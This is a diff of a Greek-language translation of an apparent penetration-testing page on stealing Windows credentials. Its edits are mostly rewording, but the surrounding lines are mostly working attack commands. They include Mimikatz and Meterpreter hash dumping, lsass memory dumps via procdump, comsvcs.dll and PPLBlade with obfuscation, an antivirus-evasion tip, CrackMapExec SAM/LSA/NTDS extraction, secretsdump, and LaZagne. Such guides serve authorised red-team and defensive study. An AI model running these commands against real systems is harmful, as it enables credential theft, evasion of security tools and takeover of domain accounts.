@@ -41,7 +41,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Πιστοποιήσεις με Meterpreter
 
-Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε κωδικούς πρόσβασης και κατακερματισμούς** μέσα στο θύμα.
+Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που έχω δημιουργήσει για να** **αναζητήσετε κωδικούς πρόσβασης και κατακερματισμούς** μέσα στο θύμα.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -58,7 +58,7 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Παράκαμψη AV
+## Bypassing AV
 
 ### Procdump + Mimikatz
 
@@ -86,14 +86,14 @@ mimikatz # sekurlsa::logonPasswords
 
 Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλο** τη χρήση του **procdump.exe για να κάνετε dump το lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι, είναι **πιο κρυφό** να **περάσετε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**
+**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλο** τη χρήση του **procdump.exe για να κάνετε dump το lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι, είναι **πιο αόρατο** να **περάσετε** ως **παράμετρο** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**
 
 ### Dumping lsass με **comsvcs.dll**
 
 Ένα DLL που ονομάζεται **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνο για **dumping process memory** σε περίπτωση κρασάρισματος. Αυτό το DLL περιλαμβάνει μια **λειτουργία** που ονομάζεται **`MiniDumpW`**, σχεδιασμένη να καλείται χρησιμοποιώντας το `rundll32.exe`.\
-Δεν είναι σχετικό να χρησιμοποιήσετε τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία συστατικά. Το ID της διαδικασίας που θα γίνει dump αποτελεί το πρώτο συστατικό, η τοποθεσία του αρχείου dump αντιπροσωπεύει το δεύτερο, και το τρίτο συστατικό είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
-Αφού αναλυθούν αυτά τα τρία συστατικά, το DLL εμπλέκεται στη δημιουργία του αρχείου dump και στη μεταφορά της μνήμης της καθορισμένης διαδικασίας σε αυτό το αρχείο.\
-Η χρήση του **comsvcs.dll** είναι εφικτή για το dumping της διαδικασίας lsass, εξαλείφοντας την ανάγκη να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Δεν είναι σχετικό να χρησιμοποιήσετε τα πρώτα δύο επιχειρήματα, αλλά το τρίτο χωρίζεται σε τρία συστατικά. Το αναγνωριστικό διεργασίας που θα γίνει dump αποτελεί το πρώτο συστατικό, η τοποθεσία του αρχείου dump αντιπροσωπεύει το δεύτερο, και το τρίτο συστατικό είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
+Αφού αναλυθούν αυτά τα τρία συστατικά, το DLL εμπλέκεται στη δημιουργία του αρχείου dump και στη μεταφορά της μνήμης της καθορισμένης διεργασίας σε αυτό το αρχείο.\
+Η χρήση του **comsvcs.dll** είναι εφικτή για το dumping της διεργασίας lsass, εξαλείφοντας την ανάγκη να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
 ```bash
@@ -101,21 +101,21 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 **Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Dumping lsass με τον Διαχειριστή Εργασιών**
+### **Εξαγωγή lsass με τον Διαχειριστή Εργασιών**
 
 1. Κάντε δεξί κλικ στη Γραμμή Εργασιών και επιλέξτε Διαχειριστής Εργασιών
 2. Κάντε κλικ σε Περισσότερες λεπτομέρειες
 3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Διαδικασίες
-4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".
+4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Δημιουργία αρχείου εξαγωγής".
 
-### Dumping lsass με το procdump
+### Εξαγωγή lsass με το procdump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο δυαδικό αρχείο της Microsoft που είναι μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumpin lsass with PPLBlade
+## Dumpin lsass με PPLBlade
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα εργαλείο εκφόρτωσης προστατευμένων διαδικασιών που υποστηρίζει την απόκρυψη εκφορτώσεων μνήμης και τη μεταφορά τους σε απομακρυσμένους σταθμούς εργασίας χωρίς να τις αποθηκεύει στον δίσκο.
 
@@ -123,7 +123,7 @@ Get-Process -Name LSASS
 
 1. Παράκαμψη προστασίας PPL
 2. Απόκρυψη αρχείων εκφόρτωσης μνήμης για να αποφευχθούν οι μηχανισμοί ανίχνευσης βασισμένοι σε υπογραφές του Defender
-3. Μεταφόρτωση εκφόρτωσης μνήμης με μεθόδους RAW και SMB χωρίς να αποθηκεύεται στον δίσκο (χωρίς αρχείο εκφόρτωσης)
+3. Μεταφόρτωση εκφόρτωσης μνήμης με μεθόδους RAW και SMB χωρίς να την αποθηκεύει στον δίσκο (χωρίς αρχείο εκφόρτωσης)
 
 {% code overflow="wrap" %}
 ```bash
@@ -137,16 +137,16 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Εκχύλιση μυστικών LSA
+### Dump LSA secrets
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Εκχύλισμα το NTDS.dit από τον στόχο DC
+### Dump the NTDS.dit από τον στόχο DC
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Εξαγωγή του ιστορικού κωδικών πρόσβασης NTDS.dit από τον στόχο DC
+### Εξαγωγή του ιστορικού κωδικών πρόσβασης NTDS.dit από τον στοχοθετημένο DC
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -156,7 +156,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 ## Stealing SAM & SYSTEM
 
-Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Αλλά **δεν μπορείτε απλώς να τα αντιγράψετε με κανονικό τρόπο** επειδή είναι προστατευμένα.
+Αυτά τα αρχεία θα πρέπει να **βρίσκονται** στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM._ Αλλά **δεν μπορείτε απλώς να τα αντιγράψετε με κανονικό τρόπο** γιατί είναι προστατευμένα.
 
 ### From Registry
 
@@ -217,7 +217,7 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 Περισσότερες πληροφορίες σχετικά με αυτό: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Στη συνέχεια, **μέρος** του αρχείου **NTDS.dit** θα μπορούσε να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα τελευταία προσπελάσιμα δεδομένα πιθανώς λόγω της βελτίωσης απόδοσης χρησιμοποιώντας μια **cache**).
+Τα Windows χρησιμοποιούν το _Ntdsa.dll_ για να αλληλεπιδρούν με αυτό το αρχείο και χρησιμοποιείται από το _lsass.exe_. Στη συνέχεια, **μέρος** του αρχείου **NTDS.dit** θα μπορούσε να βρίσκεται **μέσα στη μνήμη του `lsass`** (μπορείτε να βρείτε τα τελευταία προσπελάσιμα δεδομένα πιθανώς λόγω της βελτίωσης απόδοσης με τη χρήση μιας **cache**).
 
 #### Decrypting the hashes inside NTDS.dit
 
@@ -243,21 +243,21 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-Μπορείτε επίσης να **εξάγετε αυτά αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη διαχειριστή τομέα:
+Μπορείτε επίσης να **τα εξαγάγετε αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη διαχειριστή τομέα:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
-Για **μεγάλες NTDS.dit αρχεία** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Για **μεγάλες NTDS.dit αρχεία** συνιστάται να το εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
 Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ ή **mimikatz** `lsadump::lsa /inject`
 
-### **Εξαγωγή αντικειμένων τομέα από NTDS.dit σε βάση δεδομένων SQLite**
+### **Εξαγωγή αντικειμένων τομέα από NTDS.dit σε μια βάση δεδομένων SQLite**
 
 Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση δεδομένων SQLite με [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Όχι μόνο μυστικά εξάγονται αλλά και ολόκληρα τα αντικείμενα και τα χαρακτηριστικά τους για περαιτέρω εξαγωγή πληροφοριών όταν το αρχείο NTDS.dit έχει ήδη ανακτηθεί.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-The `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, συμπληρωματικά διαπιστευτήρια όπως καθαρού κειμένου κωδικούς πρόσβασης, kerberos ή κλειδιά εμπιστοσύνης, NT & LM ιστορικά κωδικών πρόσβασης). Μαζί με άλλες πληροφορίες, εξάγονται τα εξής δεδομένα: λογαριασμοί χρηστών και μηχανών με τους hash τους, σημαίες UAC, χρονική σήμανση για την τελευταία σύνδεση και αλλαγή κωδικού πρόσβασης, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχή, αξιόπιστοι τομείς με τύπους εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...
+Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, συμπληρωματικά διαπιστευτήρια όπως καθαρού κειμένου κωδικούς πρόσβασης, kerberos ή κλειδιά εμπιστοσύνης, NT & LM ιστορικά κωδικών πρόσβασης). Μαζί με άλλες πληροφορίες, εξάγονται τα εξής δεδομένα: λογαριασμοί χρηστών και μηχανών με τους hashes τους, UAC flags, χρονική σήμανση για την τελευταία σύνδεση και αλλαγή κωδικού πρόσβασης, περιγραφή λογαριασμών, ονόματα, UPN, SPN, ομάδες και αναδρομικές συμμετοχές, δέντρο οργανωτικών μονάδων και συμμετοχή, αξιόπιστοι τομείς με τύπους εμπιστοσύνης, κατεύθυνση και χαρακτηριστικά...
 
 ## Lazagne
 
@@ -265,7 +265,7 @@ The `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει 
 ```
 lazagne.exe all
 ```
-## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από το SAM και LSASS
+## Άλλα εργαλεία για την εξαγωγή διαπιστευτηρίων από το SAM και το LSASS
 
 ### Windows credentials Editor (WCE)
 
@@ -273,7 +273,7 @@ lazagne.exe all
 
 ### fgdump
 
-Εξαγωγή διαπιστευτηρίων από το αρχείο SAM
+Εξαγάγετε διαπιστευτήρια από το αρχείο SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
@@ -290,7 +290,7 @@ type outpwdump
 
 Κατεβάστε το από: [ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) και απλά **εκτελέστε το** και οι κωδικοί πρόσβασης θα εξαχθούν.
 
-## Αμυντικές Τακτικές
+## Defenses
 
 [**Μάθετε για κάποιες προστασίες κωδικών πρόσβασης εδώ.**](credentials-protections.md)
 
